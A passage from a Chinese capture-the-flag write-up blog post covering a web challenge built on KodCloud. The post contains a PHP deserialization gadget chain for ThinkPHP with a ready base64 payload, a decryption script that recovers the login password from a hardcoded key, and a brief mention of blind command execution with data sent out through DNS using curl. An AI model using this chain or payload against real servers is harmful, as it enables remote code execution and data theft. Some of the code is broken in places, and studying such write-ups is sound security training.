class="string">dWciOjA6e319czo2OiJlbmdpbmUiO2E6Mjp7czo0OiJ0aW1lIjtzOjU6IjEwMDg2IjtzOjQ</span></span><br><span class="line"><span class="string">6Im5hbWUiO3M6MTY6ImRhdGEvZmlsZXMvc2hlbGwiO319fX19&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rememberPassword&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;salt&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;CSRF_TOKEN&#x27;</span>:<span class="string">&#x27;4jxeh3K4CNEettFi&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;API_ROUTE&#x27;</span>:<span class="string">&#x27;user/index/loginSubmit&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,data=data)</span><br><span class="line">time = <span class="built_in">int</span>(time.time())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(time-,time+<span class="number">50</span>):</span><br><span class="line">md5_hash = hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">url2 = <span class="string">&#x27;http://192.168.146.131:3101/app/controller/user/think/&#x27;</span> + s</span><br><span class="line">tr(md5_hash)</span><br><span class="line">res = requests.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;可道&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="built_in">print</span>(md5_hash)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p>hint:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">亲爱的Chu0，</span><br><span class="line"> </span><br><span class="line">我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。</span><br><span class="line"> </span><br><span class="line">在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。</span><br><span class="line"> </span><br><span class="line">或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。</span><br><span class="line"> </span><br><span class="line">你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。</span><br><span class="line"> </span><br><span class="line">或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">POST /?user/index/loginSubmit HTTP/1.1</span><br><span class="line">Host: 192.168.128.2</span><br><span class="line">Content-Length: 162</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://192.168.128.2</span><br><span class="line">Referer: http://192.168.128.2/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmit</span><br><span class="line"> </span><br><span class="line">hint: 新建文件</span><br></pre></td></tr></table></figure>

<p>通过这个请求包可以对password进行解密</p>
<p>注意：?user&#x2F;index&#x2F;loginSubmit</p>
<p>看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loginWithToken</span>();</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$res</span> || <span class="variable">$res</span> !== <span class="literal">false</span>) <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">		<span class="variable">$data</span> = <span class="title class_">Input</span>::<span class="title function_ invoke__">getArray</span>(<span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&quot;name&quot;</span>		=&gt; <span class="keyword">array</span>(<span class="string">&quot;check&quot;</span>=&gt;<span class="string">&quot;require&quot;</span>,<span class="string">&#x27;lengthMax&#x27;</span>=&gt;<span class="number">100</span>),</span><br><span class="line">			<span class="string">&quot;password&quot;</span>	=&gt; <span class="keyword">array</span>(<span class="string">&#x27;check&#x27;</span>=&gt;<span class="string">&quot;require&quot;</span>,<span class="string">&#x27;lengthMax&#x27;</span>=&gt;<span class="number">10000</span>),</span><br><span class="line">			<span class="string">&quot;salt&quot;</span>		=&gt; <span class="keyword">array</span>(<span class="string">&quot;default&quot;</span>=&gt;<span class="literal">false</span>),</span><br><span class="line">		));</span><br><span class="line">		<span class="comment">//你知道tp吗？</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>]===<span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;salt&#x27;</span>]) &#123;</span><br><span class="line">			<span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">0</span>, <span class="number">5</span>) . <span class="string">&quot;2&amp;$%@(*@(djfhj1923&quot;</span>;</span><br><span class="line">			<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="title class_">Mcrypt</span>::<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">5</span>), <span class="variable">$key</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">userInfo</span>(<span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">		<span class="comment">// if (!is_array($user))&#123;</span></span><br><span class="line">		<span class="comment">// 	$error = UserModel::errorLang($user);</span></span><br><span class="line">		<span class="comment">// 	$error = $error ? $error:LNG(&#x27;user.pwdError&#x27;);</span></span><br><span class="line">		<span class="comment">// 	show_json($error,false);</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="comment">// if(!$user[&#x27;status&#x27;])&#123;</span></span><br><span class="line">		<span class="comment">// 	show_json(LNG(&#x27;user.userEnabled&#x27;), ERROR_CODE_USER_INVALID);</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loginSuccessUpdate</span>(<span class="variable">$user</span>);</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loginAuto</span>();</span><br><span class="line">		<span class="title function_ invoke__">show_json</span>(<span class="string">&#x27;ok&#x27;</span>,<span class="literal">true</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">accessToken</span>());</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;salt&#x27;</span>]) &#123;</span><br><span class="line">			<span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">0</span>, <span class="number">5</span>) . <span class="string">&quot;2&amp;$%@(*@(djfhj1923&quot;</span>;</span><br><span class="line">			<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="title class_">Mcrypt</span>::<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>], <span class="number">5</span>), <span class="variable">$key</span>);</span><br></pre></td></tr></table></figure>

<p>发现decode 跟踪解密</p>
<p>AI写解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">* @link http://kodcloud.com/</span><br><span class="line">* @author warlee | e-mail:kodcloud@qq.com</span><br><span class="line">* @copyright warlee <span class="number">2014.</span>(Shanghai)Co.,Ltd</span><br><span class="line">* @license http://kodcloud.com/tools/license/license.txt</span><br><span class="line">*------</span><br><span class="line">* 字符串加解密类；</span><br><span class="line">* 一次一密；且定时解密有效</span><br><span class="line">* 可用于加密&amp;动态key生成</span><br><span class="line">* demo：</span><br><span class="line">* 加密：echo Mcrypt::encode(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">* 解密：echo Mcrypt::decode(<span class="string">&#x27;9f843I0crjv5y0dWE_-uwzL_mZRyRb1ynjGK4I_IAC</span></span><br><span class="line"><span class="string">Q&#x27;</span>,<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">*/</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mcrypt</span>&#123;</span><br><span class="line">public static $defaultKey = <span class="string">&#x27;a!takA:dlmcldEv,e&#x27;</span>;</span><br><span class="line">/**</span><br><span class="line">* 字符加解密，一次一密,可定时解密有效</span><br><span class="line">*</span><br><span class="line">* @param string $string 原文或者密文</span><br><span class="line">* @param string $operation 操作(encode | decode)</span><br><span class="line">* @param string $key 密钥</span><br><span class="line">* @param <span class="built_in">int</span> $expiry 密文有效期,单位s,<span class="number">0</span> 为永久有效</span><br><span class="line">* @<span class="keyword">return</span> string 处理后的 原文或者 经过 base64_encode 处理后的密文</span><br><span class="line">*/</span><br><span class="line">public static function encode($string,$key = <span class="string">&#x27;&#x27;</span>, $expiry = <span class="number">0</span>,$cKeyS</span><br><span class="line">et=<span class="string">&#x27;&#x27;</span>,$encode=true)&#123;</span><br><span class="line"><span class="keyword">if</span>($encode)&#123;$string = rawurlencode($string);&#125;</span><br><span class="line">$ckeyLength = <span class="number">4</span>;</span><br><span class="line">$key = md5($key ? $key : self::$defaultKey); //解密密匙</span><br><span class="line">$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>)); //做数据完整性验</span><br><span class="line">证</span><br><span class="line">$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>)); //用于变化生成的</span><br><span class="line">密文 (初始化向量IV)</span><br><span class="line">$cKeySet = $cKeySet ? $cKeySet: md5(microtime());</span><br><span class="line">$keyc = substr($cKeySet, - $ckeyLength);</span><br><span class="line">$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">$keyLength = strlen($cryptkey);</span><br><span class="line">PHP</span><br><span class="line">$string = sprintf(<span class="string">&#x27;%010d&#x27;</span>, $expiry ? $expiry + time() : <span class="number">0</span>).su</span><br><span class="line">bstr(md5($string . $keyb), <span class="number">0</span>, <span class="number">16</span>) . $string;</span><br><span class="line">$stringLength = strlen($string);</span><br><span class="line"></span><br><span class="line">$rndkey = array();</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">$rndkey[$i] = <span class="built_in">ord</span>($cryptkey[$i % $keyLength]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$box = <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">// 打乱密匙簿，增加随机性</span><br><span class="line"><span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$i];</span><br><span class="line">$box[$i] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">&#125;</span><br><span class="line">// 加解密，从密匙簿得出密匙进行异或，再转成字符</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $stringLength; $i++) &#123;</span><br><span class="line">$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$a];</span><br><span class="line">$box[$a] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">$result .= <span class="built_in">chr</span>(<span class="built_in">ord</span>($string[$i]) ^ ($box[($box[$a] + $box</span><br><span class="line">[$j]) % <span class="number">256</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$result = $keyc . str_replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, base64_encode($resul</span><br><span class="line">t));</span><br><span class="line">$result = str_replace(array(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;=&#x27;</span>),array(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;.&#x27;</span>), $result);</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* 字符加解密，一次一密,可定时解密有效</span><br><span class="line">*</span><br><span class="line">* @param string $string 原文或者密文</span><br><span class="line">* @param string $operation 操作(encode | decode)</span><br><span class="line">* @param string $key 密钥</span><br><span class="line">* @param <span class="built_in">int</span> $expiry 密文有效期,单位s,<span class="number">0</span> 为永久有效</span><br><span class="line">* @<span class="keyword">return</span> string 处理后的 原文或者 经过 base64_encode 处理后的密文</span><br><span class="line">*/</span><br><span class="line">public static function decode($string,$key = <span class="string">&#x27;&#x27;</span>,$encode=true)&#123;</span><br><span class="line">$string = str_replace(array(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;.&#x27;</span>),array(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;=&#x27;</span>), $string);</span><br><span class="line">$ckeyLength = <span class="number">4</span>;</span><br><span class="line">$key = md5($key ? $key : self::$defaultKey); //解密密匙</span><br><span class="line">$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>)); //做数据完整性验</span><br><span class="line">证</span><br><span class="line">$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>)); //用于变化生成的</span><br><span class="line">密文 (初始化向量IV)</span><br><span class="line">$keyc = substr($string, <span class="number">0</span>, $ckeyLength);</span><br><span class="line">$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">$keyLength = strlen($cryptkey);</span><br><span class="line">$string = base64_decode(substr($string, $ckeyLength));</span><br><span class="line">$stringLength = strlen($string);</span><br><span class="line">$rndkey = array();</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">$rndkey[$i] = <span class="built_in">ord</span>($cryptkey[$i % $keyLength]);</span><br><span class="line">&#125;</span><br><span class="line">$box = <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"> // 打乱密匙簿，增加随机性</span><br><span class="line"><span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$i];</span><br><span class="line">$box[$i] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">&#125;</span><br><span class="line"> // 加解密，从密匙簿得出密匙进行异或，再转成字符 $result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $stringLength; $i++) &#123;</span><br><span class="line">$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$a];</span><br><span class="line">$box[$a] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">$result .= <span class="built_in">chr</span>(<span class="built_in">ord</span>($string[$i]) ^ ($box[($box[$a] + $box</span><br><span class="line">[$j]) % <span class="number">256</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$theTime = intval(substr($result, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">$resultStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (($theTime == <span class="number">0</span> || $theTime - time() &gt; <span class="number">0</span>)</span><br><span class="line">&amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, </span><br><span class="line"><span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)</span><br><span class="line">) &#123;</span><br><span class="line">$resultStr = substr($result, <span class="number">26</span>);</span><br><span class="line"><span class="keyword">if</span>($encode)&#123;$resultStr = rawurldecode($resultStr);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $resultStr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="string">&#x27;tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1h</span></span><br><span class="line"><span class="string">RiPQvaI&#x27;</span>;</span><br><span class="line">$key = substr($a, <span class="number">0</span>, <span class="number">5</span>) . <span class="string">&quot;2&amp;$%@(*@(djfhj1923&quot;</span>;</span><br><span class="line">echo Mcrypt::decode(substr($a, <span class="number">5</span>),$key);</span><br></pre></td></tr></table></figure>

<p>解密出密码为!@!@!@!@NKCTFChu0</p>
<p>其实sql文件里面也有</p>
<p>登录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db814e1f.png" alt="image-20240326033828913"></p>
<p>进入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db8a9e03.png" alt="image-20240326033936498"></p>
<p>回收站中找到shell 还原</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db9455fd.png" alt="image-20240326034213543"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db85781b.png" alt="image-20240326034248340"></p>
<p>还给了路径 尝试访问该路由发现确实存在该文件</p>
<p>结合之前的文件包含的__call() </p>
<p>直接包含  poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Collection</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Collection</span>()];<span class="comment">//触发Model __toString(),子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Collection</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$items</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;items=<span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> <span class="keyword">extends</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;data/files/shell&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="comment">//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtcc</span></span><br><span class="line">HJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2OiJ0aGlua1xDb2xs</span><br><span class="line">ZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3IjoyOntzOjc6IgA</span><br><span class="line">qAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMjoidGhpbmtcQ29uZmlnIjowOnt9fX</span><br><span class="line">M6NjoiZW5naW5lIjthOjI6e3M6NDoidGltZSI7czo1OiIxMDA4NiI7czo0OiJuYW1lIjtzO</span><br><span class="line">jE2OiJkYXRhL2ZpbGVzL3NoZWxsIjt9fX19fX0==</span><br></pre></td></tr></table></figure>

<p>发包，后面是一个无回显 rce</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441dbb4fd96.png" alt="image-20240326035138941"></p>
<p>执行命令 好像没有bash或nc 用curl dns外带成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db9dbd5e.png" alt="image-20240326034721835"></p>
<p>直接读flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441dba220d7.png" alt="image-20240326034755159"></p>
<p>结束 最后一道题太抽象了</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/')">2023-NKCTF-wp</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=2023-NKCTF-wp&amp;url=http://cszvvds.cc/2024/05/15/2023-NKCTF-wp/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
